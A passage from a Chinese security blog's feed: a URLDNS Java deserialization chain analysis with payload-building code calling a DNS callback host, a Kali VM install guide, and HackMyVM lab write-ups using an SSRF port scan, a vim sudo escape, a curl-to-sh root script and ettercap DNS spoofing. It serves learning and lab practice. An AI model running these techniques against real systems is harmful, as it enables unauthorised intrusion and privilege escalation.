<p><a class="link"   href="https://www.bilibili.com/video/BV1no4y1U7E1?vd_source=46e5237289ae6c1a3c7bcab6091e42a6" >https://www.bilibili.com/video/BV1no4y1U7E1?vd_source=46e5237289ae6c1a3c7bcab6091e42a6<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>URLDNS利用链分析</title>
    <url>/2024/11/20/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近开始接触java安全，最离不开的就是反序列化利用和那些出名的CC链。前两天学了Java序列化和反序列化，还有反射啊这些概念，其实基础还不是很扎实，还要学习。说回来，接触反序列化第一条链子就是URLDNS，对大佬来说还是很好理解的，但是我这两天看了很多博客和视频，实践下来发现里面也是有很多注意点，于是写了笔记记录下来，描述的过程帮助我把原理都顺下来，才算是消化下去了。</p>
<h4 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h4><p>这个链子来源是这个<a class="link"   href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" >知名工具<i class="fas fa-external-link-alt"></i></a>,看下里面标出来的构造链</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120221937.png" ></p>
<p>我们直接看实现代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SerializationTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://i7wo.callback.red&quot;</span>); <span class="comment">// dns外带地址</span></span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(); <span class="comment">// 一个HashMap，待会要利用里面的readObject</span></span><br><span class="line">	      hashmap.put(u,<span class="number">123</span>); </span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这几行三下五除二理想状态下就能在反序列化的过程中实现DNS解析，为什么呢？！</p>
<p>这里我们跟进一下hashmap的put方法</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222243.png" ></p>
<p>来到HashMap的put方法，我们会发现我们传入了key和value，里面会调用hash()方法，再跟进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222343.png" ></p>
<p>里面使用了hashCode，这是一个很常见的函数，原生Object类里面就有，也有很多类会重写</p>
<p>然后我们看到URL里面，里面就有hashCode</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222510.png" ></p>
<p>URL里面的hashCode调用了handler.hashCode，我们再跟进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222551.png" ></p>
<p>来到了URLStreamHandler，里面的hashCode调用了getHostAddress函数，这个函数会触发DNS解析，就达到了我们最后的目的。</p>
<p>一开始学的时候冥冥之中我知道最后hashmap的put会触发URL的hashCode，但是为什么会触发呢（其实这里就是我基础薄弱的体现）</p>
<p>后来和GPT聊了一下，和大哥聊了一下，重点在这里</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120222343.png" ></p>
<p>看这里hash函数里面调用的hashCode是<strong>取决于key</strong>的，也就是说，如果我们传入的这个key属于的那个类里面有自己重写的hashCode，程序就会调用新写的hashCode，而不是原来的。</p>
<p>应用到URL的例子，我们hashmap调用put-&gt;hash，里面调用的hashCode是key也就是URL类的hashCode。一切都清晰了起来！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.put()</span><br><span class="line">	-&gt; HashMap.hash(key)// </span><br><span class="line">		-&gt; key.hashCode()=URL.hashCode()</span><br><span class="line">			-&gt;handler.hashCode()</span><br><span class="line">				-&gt;触发getHostAddress()，实现DNS解析</span><br></pre></td></tr></table></figure>

<p>所以这就是链子的过程，吃透了之后就觉得不复杂了。但是我们之间执行上面的代码却发现dns解析的次数效果不符合我们的预期，这就引入到我们的下一步分析</p>
<h4 id="利用反射复现出理想效果"><a href="#利用反射复现出理想效果" class="headerlink" title="利用反射复现出理想效果"></a>利用反射复现出理想效果</h4><p>我们在序列化操作的时候就会收到DNS解析，这不是我们理想中的效果。</p>
<p>从原理看，URL的hashCode有一个判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="built_in">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会判断hashCode的值，如果不是-1会直接返回hashCode的值，而不会进入我们想要调用的handler.hashCode</p>
<p>在序列化的时候会触发是因为URL里面初始化定义hashCode是-1，所以一开始会调用一次，而且后面赋值更改了之后就进不去了。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20241120223737.png" ></p>
<p>所以按之前什么的代码执行，序列化的时候就出现了dns解析，后面反序列化的时候却没发生，这明显不是我们理想中的效果。</p>
<p>那我们现在要做的是保证整个实验过程，只有序列化和反序列化才会触发handler.hashCode，那么我们就要解决两个问题：第一是put之前hashmap的hashCode不是-1，put之后再把它变回-1。这里我们就用到<strong>反射</strong></p>
<blockquote>
<p>Java 反射机制允许在运行时动态地获取类的信息（如字段、方法、构造函数等），并操作类的对象，从而实现更加灵活和通用的代码。</p>
</blockquote>
<p>反射的流程是先获取类，然后实例化对象，获取类里面的属性，做一些修改对象属性或者调用方法等操作。</p>
<p>看实现代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://diru.callback.red&quot;</span>);</span><br><span class="line">HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> u.getClass(); <span class="comment">// 获取u的类 这里是 class.java.net.URL</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">HashCodeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>); <span class="comment">// geiDeclaredField获取里面的变量hashCode</span></span><br><span class="line">HashCodeField.setAccessible(<span class="literal">true</span>); <span class="comment">// 设置访问权限为看修改</span></span><br><span class="line"><span class="comment">// 接下来就可以对变量的操作，修改成我们想要的值</span></span><br><span class="line">HashCodeField.set(u,<span class="number">1234</span>);  <span class="comment">// 随便一个不是-1的值</span></span><br><span class="line">hashmap.put(u,<span class="number">1</span>);<span class="comment">// HashMap的put给键值对赋值</span></span><br><span class="line">HashCodeField.set(u,-<span class="number">1</span>);  <span class="comment">// 再修改回-1，保证反序列化的过程中可以被成功调用</span></span><br><span class="line">serialize(hashmap); <span class="comment">// 进入反序列化</span></span><br></pre></td></tr></table></figure>

<p>利用反射进行一系列操作，最后保证只有在反序列化的时候才能看到DNS解析，至此，链子就分析完成了。</p>
<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>感谢前面各位师傅写的解释教学，这里就不一一列出来了。本人还在学习，基础不是非常扎实，如果这篇文章哪里写的不好，非常欢迎找我指正交流，感谢🙏</p>
]]></content>
      <tags>
        <tag>学习笔记</tag>
        <tag>Java</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Macbook M系统芯片用UTM安装最新kali linux</title>
    <url>/2024/09/11/Macbook-M%E7%B3%BB%E7%BB%9F%E8%8A%AF%E7%89%87%E7%94%A8UTM%E5%AE%89%E8%A3%85%E6%9C%80%E6%96%B0kali-linux/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这两天偶然一个契机想装个最新的kali，找到官网的教程装起来很轻松。回想刚开始接触装虚拟机的时候起码折腾一星期，所以就像写个博客记录一下，如果有人看到有被帮助到，那就更好了，希望你能少踩点坑吧。</p>
<p><a class="link"   href="https://www.kali.org/docs/virtualization/install-utm-guest-vm/" >官方参考文档<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h4><p>UTM：找到<a class="link"   href="https://mac.getutm.app/" >官网<i class="fas fa-external-link-alt"></i></a>下载安装即可</p>
<p>Kali镜像：<a class="link"   href="https://www.kali.org/get-kali/#kali-installer-images" >镜像地址<i class="fas fa-external-link-alt"></i></a></p>
<p>记得选择这个Apple sllicon的，中间recommend那个就行</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911113834.png" ></p>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>在UTM找到“新建”添加一个虚拟机，<strong>选择“虚拟化”-&gt;“其他”</strong></p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911114826.png"   style="zoom:50%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115935.png"   style="zoom:50%;" >

<p>在第三个页面点击“浏览”，把我们下载的kali镜像挂上去</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115109.png"   style="zoom:50%;" >

<p>接下来就一直点击“继续”，可以根据自己的需要调整内存和CPU核数量</p>
<p>到虚拟机设置完成，我们还需要编辑一下一些配置</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115415.png" ></p>
<p>我们需要在这里添加一个serial</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115450.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911115651.png" ></p>
<p>然后<strong>保存</strong>即可，启动虚拟机进行一些配置</p>
<h4 id="Kali初始配置"><a href="#Kali初始配置" class="headerlink" title="Kali初始配置"></a>Kali初始配置</h4><p>虚拟机启动后就能看到选择，这里我选择了图形化安装</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120052.png" ></p>
<p>语言选English</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120149.png" ></p>
<p>时区建议选择Hong Kong</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120217.png" ></p>
<p>键盘也是选美式的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120243.png" ></p>
<p>接下来就是个性化制定你的用户名和机子的名字了，自己选吧</p>
<p>填完一些了个性化名字，到了这里我选择第一个</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911120656.png" ></p>
<p>接下来就是一路选择yes&#x2F;continue就行，等待虚拟机自己加载</p>
<p>经过漫长的等待，到看到这个页面就可以了，选择continue到出现黑屏的时候把虚拟机关闭</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911122515.png" ></p>
<p>然后回到UTM打开虚拟机编辑，把之前挂载的iso和serial给删了，再到这个“显示”</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911122841.png" ></p>
<p>把选项改成’virtio-gpu-pci’，再保存启动虚拟机，正常输入你之前设置的账号密码，正常开机，大功告成！</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240911123136.png" ></p>
<h4 id="关于复制粘贴的补充"><a href="#关于复制粘贴的补充" class="headerlink" title="关于复制粘贴的补充"></a>关于复制粘贴的补充</h4><p>用了几天下来发现不能和物理主机共享剪切板，非常难受，经过一番摸索，找到了可惜的解决方法，在此记录一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt-get install qemu-guest-agent</span><br><span class="line">sudo apt install spice-vdagent</span><br></pre></td></tr></table></figure>

<p>安装完这些再重启虚拟机即可！</p>
]]></content>
      <tags>
        <tag>随笔</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm Colors复盘</title>
    <url>/2024/03/20/hackmyvm-Colors%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>这个靶场涉及的知识点比较多，思路是大部分学习其他师傅的wp的，写复盘是想记录思路顺便回顾学好每个知识点。</p>
<h4 id="启动前准备"><a href="#启动前准备" class="headerlink" title="启动前准备"></a>启动前准备</h4><p>由于<strong>网卡配置不同</strong>，我每次都需要开靶机刚开启的时候shift+e进入grub编辑，给一个root的&#x2F;bin&#x2F;bash启动编辑一下&#x2F;etc&#x2F;netwrok&#x2F;interfaces里面的网卡配置，这是前置背景。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320144812.png" ></p>
<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Colors" >https://hackmyvm.eu/machines/machine.php?vm=Colors<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>ip：192.168.64.92</p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>nmap扫到21、22、80端口，并且22端口被过滤了（注意这里要用root扫如果用普通用户扫扫不到22端口信息）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154203.png" ></p>
<p>先访问80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154338.png" ></p>
<p>只有一张图片，扫目录一无所获，也对图片分析不出什么内容</p>
<p>看看21号端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154455.png" ></p>
<p>看起来可以用anonymous登陆，登陆一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320154607.png" ></p>
<p>把secret.jpg下载下来，使用stegseek分析一波</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155012.png" ></p>
<p>搞出来一段字符，在cyberchef分析，是base85</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320155123.png" ></p>
<p>得到一个pink的账号密码，这个时候我的思路是去登陆22端口，但是它的端口filted，后来去看了wp才知道这里有一个端口敲门，ftp那里就给了提示（好神奇的点子）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.54.39.png" ></p>
<p>1127，1039，1081分别对应first，second，third敲门顺序，按顺序敲门端口才会打开，类似情况之前做vuln的DC系列的靶机也遇到过。</p>
<h5 id="一个问题"><a href="#一个问题" class="headerlink" title="一个问题"></a>一个问题</h5><p>知道了这个思路，我按照常规思路knock三个端口，然而22端口没有按照预期的打开，我试了很多次，还是失败，也不知道原因。第二天为了想实践后面的关卡，想着干脆关了防火墙，所以借助grub登陆root，按照网上给的命令总是失败，更头疼了。然后就想看看knock的配置文件，找到日志文件，一看到enp0s3我就想到要改成enp01，思路就来了。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2014.56.31.png" ></p>
<p>于是经过一番搜索，找到&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;knockd.service，把里面的enp0s3改成enp0s1，再启动靶机</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2015.24.31.png" ></p>
<p>这次就可以了</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320160752.png" ></p>
<p>虽然这个问题是针对自己的电脑产生的，别人的电脑可能不会出现这样的情况，但是整个过程是自己一点一点摸索到，最后成功解决的时候真的很开心，所以值得记录一下。</p>
<h4 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h4><p>ok解决了ssh的问题，想用之前拿到的pink账号密码登陆，还是失败</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161201.png" ></p>
<p>报错说publickey，说明需要密钥文件登陆。搞半天pink的账号密码可以用ftp登陆，对ftp的敏感度还不够，一直没想到，登陆后</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161544.png" ></p>
<p>pink目录下有.ssh目录，<strong>思路是在里面上传自己kali的id_rsa.pub（命名为authorized_keys)，然后用那个文件为凭证自己kali登陆ssh</strong></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161803.png" ></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320161819.png" ></p>
<p>登陆成功</p>
<h4 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h4><p>拿到pink的shell后没能发现什么，接下来的思路是去到&#x2F;var&#x2F;www&#x2F;html上传一个a.php，再在网页端访问a.php，就拿到www-data的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320212842.png" ></p>
<p>Sudo -l查看到green有vim可以利用提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -u green /usr/bin/vim</span><br></pre></td></tr></table></figure>

<p>再输入’:!&#x2F;bin&#x2F;sh’，成功拿到green的shell</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320213122.png" ></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">green@color:/var/www/html$ <span class="built_in">cd</span> /home/green</span><br><span class="line"><span class="built_in">cd</span> /home/green</span><br><span class="line">green@color:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">note.txt  test_4_green</span><br><span class="line">green@color:~$ <span class="built_in">cat</span> no</span><br><span class="line"><span class="built_in">cat</span> note.txt</span><br><span class="line">You<span class="string">&#x27;ve been working very well lately Green, so I&#x27;</span>m going to give you one last <span class="built_in">test</span>. If you pass it I<span class="string">&#x27;ll give you the password for purple.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-root</span></span><br><span class="line"><span class="string">green@color:~$ ./test_4_green</span></span><br><span class="line"><span class="string">./test_4_green</span></span><br><span class="line"><span class="string">Guess the number im thinking: 1</span></span><br><span class="line"><span class="string">1</span></span><br><span class="line"><span class="string">Nope, sorry</span></span><br><span class="line"><span class="string">green@color:~$</span></span><br></pre></td></tr></table></figure>

<p>到green到家目录下大致可以利用的就是test_4_green，下载到本地，ida打开查看一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.48.22.png" ></p>
<p>注意到有个jnz比较</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.50.38.png" ></p>
<p>大致就是比较v8和v7，这里用ida修改一下jnz为jz</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320215526.png" ></p>
<p>保存后再执行，随便输入一个数字也会爆出密码</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-20%2021.57.24.png" ></p>
<p>接着就登陆purple账户</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">purple@color:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> purple on color:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User purple may run the following commands on color:</span><br><span class="line">    (root) NOPASSWD: /attack_dir/ddos.sh</span><br><span class="line">purple@color:~$ <span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="built_in">cat</span> /attack_dir/ddos.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p</span><br></pre></td></tr></table></figure>

<p>sudo -l发现有个脚本可以用，就是要下载masterddos.hmv下的attack.sh然后交给&#x2F;usr&#x2F;bin&#x2F;sh 执行</p>
<p><strong>思路是利用dns欺骗，让靶机向自己的kali发送请求，自己的kali伪造一个attack.sh，让靶机访问</strong></p>
<p>步骤：</p>
<p>先在修改&#x2F;etc&#x2F;ettercap&#x2F;etter.dns文件，增加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">masterddos.hmv A 192.168.64.3</span><br></pre></td></tr></table></figure>

<p>然后开始dns攻击</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ettercap -i eth0 -Tp -M arp:remote -P dns_spoof /192.168.64.92// /192.168.64.1//</span><br></pre></td></tr></table></figure>

<p>在靶机去ping masterddos.hmv，回复的ip是kali的ip，DNS欺骗执行成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">purple@color:~$ ping masterddos.hmv</span><br><span class="line">ping masterddos.hmv</span><br><span class="line">PING masterddos.hmv (192.168.64.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=1 ttl=64 time=1.49 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=2 ttl=64 time=0.915 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=3 ttl=64 time=0.972 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=4 ttl=64 time=1.08 ms</span><br><span class="line">64 bytes from 192.168.64.3 (192.168.64.3): icmp_seq=5 ttl=64 time=0.681 ms</span><br></pre></td></tr></table></figure>

<p>接着就sudo &#x2F;attack_dir&#x2F;ddos.sh执行脚本</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240320222448.png" ></p>
<p>成功拿到root的shell，提权成功。</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>第一次遇到<strong>DNS欺骗</strong>，学到了，通过ftp敲门那里思路比较清奇，要打破惯性思维，不要一看到账号密码只想到ssh的网页，还有ftp！可执行文件修改（二进制方向的魅力），knock开端口（注意网卡配置），还有一般都是先拿到www-data再拿到其他账户的shell，这次是先有个pink才有www-data。</p>
<p>这么理下来知识点也不是特别多，但我就要消化好久，自己做的时候没办法想到的思路无非就是因为知识面不够广，还有就是脑子不够灵活（比如没想到拿账号密码登陆ftp），路漫漫。</p>
]]></content>
      <tags>
        <tag>hackmyvm</tag>
        <tag>复盘</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>hackmyvm casino复盘</title>
    <url>/2024/03/18/hackmyvm-casino%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h4><p>地址：<a class="link"   href="https://hackmyvm.eu/machines/machine.php?vm=Casino" >https://hackmyvm.eu/machines/machine.php?vm=Casino<i class="fas fa-external-link-alt"></i></a></p>
<p>难度：medium</p>
<p>靶机ip：192.168.64.82</p>
<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>端口扫描扫到22和80端口</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165203.png" ></p>
<p>先到80端口，有个登陆页面，不知道账号密码，先注册一个账号</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165317.png" ></p>
<p>登陆进去后有个三个赌博游戏，起始金额是1000$，经过一番探索结合扫到的目录，我随便在猜点数的游戏把金额全部输光，接着界面就给我跳转到以下这个</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165533.png" ></p>
<p>注意url是”<strong>&#x2F;casino&#x2F;explainmepls.php?learnabout&#x3D;en.wikipedia.org&#x2F;wiki&#x2F;Dice</strong>“，经过测试没办法文件包含查看一下文件，但是?learnabout&#x3D;<a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a> 会跳转，猜测是存在ssrf漏洞，验证一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318165739.png" ></p>
<p>会出现最开始看到的登陆页面，接着就fuzz一下对内有哪些端口开了（记得带上cookie）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ((i=<span class="number">1</span>; i&lt;=<span class="number">65535</span>; i++)); <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$i</span>&quot;</span> &gt;&gt; dictionary.txt</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">先生成一个脚本</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w dictionary.txt -u <span class="string">&#x27;http://192.168.64.82/casino/explainmepls.php?learnabout=127.0.0.1:FUZZ&#x27;</span> -fw 284 -b <span class="string">&quot;PHPSPHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span></span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240318182217.png" ></p>
<p>扫到了6969端口，先访问看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002002.png" ></p>
<p>是有东西的，扫一下目录看看</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u <span class="string">&quot;http://192.168.64.82/casino/explainmepls.php?learnabout=localhost:6969/FUZZ&quot;</span> -b <span class="string">&quot;PHPSESSID=kd3kcoc7nogvaeqsqktu0ktctb&quot;</span> -fw 284</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319004853.png" ></p>
<p>扫到&#x2F;codebreakers，</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.23.29.png" ></p>
<p>看到源码有个shimmer_rsa，访问之后意识一个私钥内容</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002436.png" ></p>
<p>保存之后利用这个文件ssh登陆成功</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002651.png" ></p>
<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319002957.png" ></p>
<p>可以看到目录下有个pass，是可以执行的，是要猜密码，传到本地用ida分析看看</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-03-19%2000.31.48.png"  alt="main函数"></p>
<p>点击看一下第一个密码的checkpasswd函数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240319003547.png" ></p>
<p>有很多个表达式去匹配，我想到用z3去运算出结果</p>
